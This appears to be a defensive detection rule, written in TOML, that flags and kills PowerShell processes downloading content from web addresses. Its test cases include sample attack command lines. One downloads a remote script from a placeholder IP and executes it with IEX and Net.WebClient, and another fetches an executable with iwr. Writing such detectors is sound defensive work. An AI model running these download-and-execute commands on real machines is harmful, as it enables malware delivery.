[rule]
id = "etap-009"
name = "PowerShell Download Cradle"
description = "PowerShell downloading content from a web address, the usual first step of a malware loader."
version = "1"
author = "E-TAP team"
license = "MIT"
os_list = ["windows"]
query = '''process where
  process.name in~ ("powershell.exe", "pwsh.exe")
  and process.command_line : ("DownloadString", "DownloadFile", "DownloadData", "Net.WebClient", "Invoke-WebRequest", "Invoke-RestMethod", "Start-BitsTransfer", "iwr ", "irm ")
  and process.command_line : ("http://", "https://", "ftp://")
'''

[[actions]]
action = "kill_process"

[[threat]]
tactic.name = "Execution"
[[threat.technique]]
id = "T1059.001"
name = "Command and Scripting Interpreter: PowerShell"

[[threat]]
tactic.name = "Command and Control"
[[threat.technique]]
id = "T1105"
name = "Ingress Tool Transfer"

[[tests]]
name = "webclient"
expect = "match"
event = { _category = "process", event = { action = "start" }, process = { name = "powershell.exe", executable = "C:\\Windows\\System32\\powershell.exe", command_line = "powershell -c IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.5/a.ps1')" } }

[[tests]]
name = "iwr"
expect = "match"
event = { _category = "process", event = { action = "start" }, process = { name = "pwsh.exe", executable = "C:\\Windows\\System32\\pwsh.exe", command_line = "pwsh -c iwr https://example.test/x.exe -OutFile x.exe" } }

[[tests]]
name = "local listing"
expect = "no_match"
event = { _category = "process", event = { action = "start" }, process = { name = "powershell.exe", executable = "C:\\Windows\\System32\\powershell.exe", command_line = "powershell Get-ChildItem C:\\Users" } }

[[tests]]
name = "web cmdlet without an address"
expect = "no_match"
event = { _category = "process", event = { action = "start" }, process = { name = "powershell.exe", executable = "C:\\Windows\\System32\\powershell.exe", command_line = "powershell Invoke-WebRequest -Uri internal-name" } }
